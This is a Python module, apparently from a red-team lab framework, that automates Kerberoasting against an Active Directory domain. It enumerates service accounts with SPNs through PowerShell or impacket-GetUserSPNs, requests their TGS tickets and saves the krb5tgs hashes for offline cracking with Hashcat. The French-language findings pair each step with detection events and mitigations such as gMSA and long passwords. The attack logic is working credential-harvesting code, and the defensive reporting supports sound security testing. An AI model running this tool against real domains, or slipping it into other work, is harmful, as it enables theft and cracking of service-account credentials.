"""
Red Team - Kerberoasting
========================
MITRE ATT&CK: T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting

Any domain user can request a Kerberos Service Ticket (TGS) for any account
that has a Service Principal Name (SPN) registered. The TGS is encrypted with
the service account's NTLM hash, allowing offline password cracking without
triggering lockouts.

Attack flow:
    1. Enumerate accounts with SPN using GetUserSPNs.py or PowerShell
    2. Request TGS tickets for each SPN account
    3. Extract the encrypted tickets (krb5tgs hashes)
    4. Crack hashes offline with Hashcat (mode 13100)

Detection indicators:
    - Event ID 4769: Kerberos Service Ticket Request - watch for volume spikes
    - Wazuh Rule 60106: Anomalous TGS request volume

Mitigation:
    - Use Group Managed Service Accounts (gMSA) with auto-rotating passwords
    - Set service account passwords to 25+ random characters
    - Monitor Event ID 4769 for unusual request volumes

⚠  FOR USE IN ISOLATED LAB ENVIRONMENTS ONLY.
"""

import subprocess
import os
import re
from datetime import datetime

from utils.format_utils import print_info, print_warning, print_success, print_error


ATTACK_META = {
    "name":       "Kerberoasting",
    "phase":      "Credential Access",
    "mitre":      "T1558.003",
    "risk":       "Critique",
    "event_ids":  [4769],
    "tools":      ["Impacket (GetUserSPNs.py)", "Rubeus", "PowerView"],
    "description": (
        "Tout utilisateur du domaine peut demander un ticket de service Kerberos (TGS) pour "
        "n'importe quel compte disposant d'un SPN. Ce ticket est chiffré avec le hash NTLM du "
        "compte de service, ce qui permet de le récupérer et de le craquer hors-ligne sans "
        "déclencher de verrouillage de compte."
    ),
}


def run_attack(target: str = "domain.local", domain: str = "domain.local",
               user: str = None, password: str = None, **kwargs) -> dict:
    """
    Simulate a Kerberoasting attack.
    1. Enumerate SPN accounts
    2. Request TGS tickets
    3. Save hashes for optional offline cracking
    """
    print_warning(f"[RED TEAM] Kerberoasting → {target}")
    findings = []
    hashes   = []

    # Step 1: Enumerate SPN accounts
    spn_accounts = _enumerate_spns(domain, user, password, target)
    if not spn_accounts:
        findings.append({
            "risk":        "Info",
            "title":       "Aucun compte SPN trouvé",
            "description": "Aucun compte de service avec SPN n'a été détecté dans le domaine.",
            "mitigation":  "Si des comptes de service existent, vérifier leur configuration SPN.",
            "event_ids":   [],
        })
        return _build_result("success", findings, hashes, [])

    findings.append({
        "risk":        "Élevé",
        "title":       f"{len(spn_accounts)} compte(s) avec SPN détecté(s)",
        "description": "Comptes : " + ", ".join(spn_accounts[:10]),
        "mitigation":  "Utiliser des Managed Service Accounts (gMSA) avec mots de passe longs automatiques.",
        "mitigation_technique": (
            "1. Migrer vers des Group Managed Service Accounts (gMSA) avec rotation automatique.\n"
            "2. Fixer les mots de passe de service à 25+ caractères aléatoires.\n"
            "3. Limiter la création de SPN à une whitelist stricte de comptes.\n"
            "4. Auditer régulièrement les comptes SPN actifs."
        ),
        "mitigation_humaine": (
            "Sensibiliser les équipes applicatives et les architectes infra à la dangerosité des comptes "
            "SPN classiques. Intégrer le Kerberoasting risk dans la revue de sécurité des déploiements d'applications."
        ),
        "impact": "Énumération des comptes de service, compromission potentielle via craquage hors-ligne.",
        "logs_siem": [
            {"event_id": 4769, "description": "Kerberos Service Ticket Request — pic anormal attendu"},
        ],
        "event_ids":   [4769],
    })

    # Step 2: Request TGS tickets
    print_info(f"Demande de tickets TGS pour {len(spn_accounts)} compte(s)...")
    hashes = _request_tgs(domain, user, password, target)

    if hashes:
        findings.append({
            "risk":        "Critique",
            "title":       f"{len(hashes)} hash(es) TGS extrait(s)",
            "description": (
                "Les hashes Kerberos (krb5tgs) ont été capturés. "
                "Ils peuvent être crackés hors-ligne avec Hashcat (mode 13100)."
            ),
            "mitigation":  (
                "1. Mots de passe longs (>25 car.) pour tous les comptes de service.\n"
                "2. Activer le monitoring Event ID 4769 en masse.\n"
                "3. Implémenter des gMSA (Group Managed Service Accounts).\n"
                "4. Limiter les SPN aux comptes strictement nécessaires."
            ),
            "mitigation_technique": (
                "1. Forcer les gMSA pour tous les comptes de service nouveaux.\n"
                "2. Implémenter une stratégie de mots de passe complexes (>25 car., renouvellement annuel).\n"
                "3. Surveiller les 4769 en continu via SIEM et alerter sur volume anormal.\n"
                "4. Exécuter du Kerberoasting offensif en boucle (en lab) pour tester la détection."
            ),
            "mitigation_humaine": (
                "Former les administrateurs sur le Kerberoasting risk. Ajouter une étape dans la procédure "
                "de création de compte de service : 'Vérifier si gMSA est applicable'. Intégrer la rotation "
                "des mots de passe de service au calendrier de maintenace (ex. annuel). Ajouter une astreinte "
                "pour l'investigation rapide des pics 4769."
            ),
            "impact": f"{len(hashes)} hash(es) de compte(s) de service extrait(s), craquables hors-ligne, menant potentiellement à un accès réseau SYSTEM.",
            "logs_siem": [
                {"event_id": 4769, "description": f"Volume {len(hashes)} de requêtes TGS capturées"},
                {"rule": "Wazuh 60106", "description": "Anomalous TGS request volume (si activée)"},
            ],
            "event_ids":   [4769],
        })

    # Step 3: Collect SIEM-observable indicators
    iocs = _build_iocs(spn_accounts, hashes)

    return _build_result("success" if hashes else "partial", findings, hashes, iocs)


# ── Private ───────────────────────────────────────────────────────────────────

def _enumerate_spns(domain: str, user: str, password: str, target: str = None) -> list:
    """Try to enumerate SPN accounts via PowerShell or impacket."""
    # Try PowerShell (if on DC or domain-joined machine)
    try:
        cmd = (
            "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} "
            "-Properties ServicePrincipalName | "
            "Select-Object SamAccountName | ConvertTo-Json"
        )
        result = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", cmd],
            capture_output=True, text=True, timeout=20
        )
        if result.returncode == 0 and result.stdout.strip():
            import json
            data = json.loads(result.stdout.strip())
            if not isinstance(data, list):
                data = [data]
            return [a.get("SamAccountName", "?") for a in data]
    except Exception:
        pass

    # Try impacket GetUserSPNs.py (Kali / Linux)
    if user and password:
        try:
            cmd = [
                "impacket-GetUserSPNs",
                f"{domain}/{user}:{password}", "-dc-ip", target,
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                lines = result.stdout.strip().split("\n")
                spns = []
                for line in lines[2:]:  # Skip header lines
                    parts = line.split()
                    if parts and "/" in parts[0]:
                        spns.append(parts[0])
                return spns
        except Exception:
            pass

    return []


def _request_tgs(domain: str, user: str, password: str, target: str) -> list:
    """Request TGS tickets and return extracted hashes."""
    hashes = []
    if user and password:
        try:
            cmd = [
                "impacket-GetUserSPNs",
                f"{domain}/{user}:{password}", "-dc-ip", target, "-request",
                "-outputfile", "/tmp/kerberoast_hashes.txt",
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                hash_file = "/tmp/kerberoast_hashes.txt"
                if os.path.exists(hash_file):
                    with open(hash_file) as f:
                        content = f.read()
                    hashes = re.findall(r"\$krb5tgs\$\d+\$.+", content)
        except Exception:
            pass
    return hashes


def _build_iocs(spn_accounts: list, hashes: list) -> list:
    return [
        {
            "type":        "event_id",
            "value":       4769,
            "description": "Kerberos Service Ticket Request - surveiller le volume anormal",
        },
        {
            "type":        "account_list",
            "value":       spn_accounts,
            "description": "Comptes avec SPN ciblés",
        },
        {
            "type":        "hash_count",
            "value":       len(hashes),
            "description": "Hashes TGS extraits",
        },
    ]


def _build_result(status: str, findings: list, hashes: list, iocs: list) -> dict:
    return {
        "module":      "red_team.kerberoasting",
        "status":      status,
        "timestamp":   datetime.now().isoformat(),
        "attack_meta": ATTACK_META,
        "findings":    findings,
        "artifacts": {
            "hashes":    hashes,
            "hash_type": "krb5tgs (Hashcat mode 13100)",
        },
        "iocs":    iocs,
        "summary": {
            "hashes_extracted": len(hashes),
            "findings":         len(findings),
        },
    }
